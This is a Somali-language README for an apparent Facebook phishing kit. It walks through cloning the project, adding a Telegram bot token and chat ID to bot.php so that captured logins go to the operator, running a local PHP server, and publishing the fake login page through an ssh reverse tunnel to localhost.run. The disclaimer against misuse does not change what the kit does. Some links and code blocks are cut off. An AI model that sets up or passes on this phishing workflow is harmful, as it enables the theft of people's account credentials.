### Hordhac
fahan ku saabsan sida loo sameeyo login page oo isku xidha Telegram bot. Fadlanprojectgan ha u isticmaalin qaab khaldan.

### Tallaabooyinka ku saabsan sida loo edite gareeyo bot.php

1. **Soo degsashada Termux:**
    - Aad [F-Droid](https://f-droid.org/) oo raadi Termux.
    - Soo deji oo soo furo.

2. **Soo dajinta PHP iyo Composer:**
    - Fur Termux oo geli amarradan:
    ```sh
    pkg update
    pkg upgrade
    pkg install php
    pkg install composer
    ```

3. **Soo dajiso koodhka:**
    ```
    Git clone https://github.com/Anonyducoo/Facebook_shabaqaysi
    cd Facebook_shabaqaysi

**Ku dar Token-kaaga iyo Chat ID gaaga:**
    - Hel token-kaaga bot-ka adigoo aadaya [Telegram BotFather](https://core.telegram.o>
    - Hel Chat ID adigoo isticmaalaya bot-ka [userinfobot](https://t.me/userinfobot)

- Faylka `bot.php` wuxuu u egyahay sidan:
    ```php
    <?php
    $botToken = 'TOKEN-KAAGA-HALKAAN-GALI';
    $chatId = 'CHAT-ID-KAAGA-HALKAAN-GALI';

kadibna save garee.

"php -S localhost:8080"

4. **Port forwarding**
 ```
    session cusub soo furo kadibma gali
    ssh -R 80:localhost:8080 nokey@localhost.run
    ```
    - Fur browser-kaaga oo gali URL ga uu kusiiyey.

###  Nagu soo biir Telegram Channelkayaga
'https://t.me/anonyducoo'
